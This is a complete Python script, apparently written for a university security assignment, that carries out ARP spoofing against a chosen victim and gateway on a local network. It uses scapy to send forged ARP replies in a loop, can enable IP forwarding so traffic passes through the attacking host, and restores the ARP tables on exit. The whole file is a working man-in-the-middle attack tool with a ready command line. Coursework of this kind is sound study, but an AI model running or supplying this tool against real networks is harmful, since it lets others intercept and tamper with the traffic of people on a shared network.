#!/usr/bin/env python3
"""
arp_spoof.py
Usage example:
  sudo python3 arp_spoof.py 
  -i eth0 
  -v 192.168.200.129 
  -g 192.168.200.131 
  --enable-forward 
  -n 2 
  -V


This is compliant with request from task 1 of DAT505 assignment 2
"""

import argparse
import time
import sys
#threading is also implemented
import threading
import signal
from scapy.all import ARP, Ether, send, sr1, conf, get_if_hwaddr

conf.verb = 0

stop_event = threading.Event()

def get_mac(ip, iface, timeout=2, retry=2):
    #Send ARP who-has to get MAC for ip.
    for _ in range(retry):
        resp = sr1(ARP(op=1, pdst=ip), timeout=timeout, iface=iface, verbose=0)
        if resp is not None:
            return resp.hwsrc
    return None

def enable_ip_forward(enable=True):
    path = "/proc/sys/net/ipv4/ip_forward"
    try:
        with open(path, "w") as f:
            f.write("1\n" if enable else "0\n")
    except PermissionError:
        print("Permission error setting IP forwarding. You should run as root.")
        sys.exit(1)

def poison_once(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, verbose=False):
    # Tell victim that gateway IP is at attacker MAC:
    # controllare se questa parte ok
    pkt1 = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac, hwsrc=attacker_mac)
    # Tell gateway that victim IP is at attacker MAC:
    pkt2 = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac, hwsrc=attacker_mac)
    send(pkt1, iface=iface, verbose=0)
    send(pkt2, iface=iface, verbose=0)
    if verbose:
        print(f"Sent poison to {victim_ip} ({victim_mac}) and {gateway_ip} ({gateway_mac})")

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac, iface, verbose=False):
    # Send correct ARP mapping to victim & gateway several times
    if verbose:
        print("Restoring ARP tables...")
    pkt1 = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac)
    pkt2 = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac)
    for _ in range(5):
        send(pkt1, iface=iface, count=1, verbose=0)
        send(pkt2, iface=iface, count=1, verbose=0)
        time.sleep(0.5)
    if verbose:
        print("Restore packets sent.")

def poison_loop(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, interval, verbose=False):
    try:
        while not stop_event.is_set():
            poison_once(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, verbose)
            time.sleep(interval)
    except KeyboardInterrupt:
        pass

def sigint_handler(signum, frame):
    stop_event.set()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP spoof tool - poison victim and gateway")
    parser.add_argument("-v", "--victim", required=True, help="Victim IP (e.g. 192.168.200.129)")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP (e.g. 192.168.200.131)")
    parser.add_argument("-i", "--iface", required=True, help="Interface to use (e.g. eth0)")
    parser.add_argument("--victim-mac", help="Victim MAC (optional)")
    parser.add_argument("--gateway-mac", help="Gateway MAC (optional)")
    parser.add_argument("--enable-forward", action="store_true", help="Enable IP forwarding on attacker")
    parser.add_argument("-n", "--interval", type=float, default=2.0, help="Poison interval seconds (default: 2)")
    parser.add_argument("-V", "--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()

    signal.signal(signal.SIGINT, sigint_handler)
    signal.signal(signal.SIGTERM, sigint_handler)

    attacker_mac = get_if_hwaddr(args.iface)
    if args.verbose:
        print(f"Attacker MAC on {args.iface}: {attacker_mac}")

    # Resolve MACs if not provided
    victim_mac = args.victim_mac or get_mac(args.victim, args.iface)
    gateway_mac = args.gateway_mac or get_mac(args.gateway, args.iface)

    if victim_mac is None or gateway_mac is None:
        print("Could not resolve victim/gateway MACs. Ensure they are up and reachable on the network.")
        sys.exit(1)

    if args.verbose:
        print(f"Victim {args.victim} -> {victim_mac}")
        print(f"Gateway {args.gateway} -> {gateway_mac}")

    # Enable IP forwarding if asked
    if args.enable_forward:
        if args.verbose:
            print("Enabling IP forwarding on attacker")
        enable_ip_forward(True)

    print("Starting ARP poisoning. Press Ctrl-C to stop and restore.")
    t = threading.Thread(target=poison_loop, args=(args.victim, victim_mac, args.gateway, gateway_mac, attacker_mac, args.iface, args.interval, args.verbose))
    t.start()
    # keep main thread waiting
    while not stop_event.is_set():
        time.sleep(0.2)

    # cleanup
    if args.enable_forward:
        if args.verbose:
            print("Disabling IP forwarding on attacker")
        enable_ip_forward(False)

    restore(args.victim, victim_mac, args.gateway, gateway_mac, args.iface, args.verbose)
    print("Exiting. ARP tables restored.")
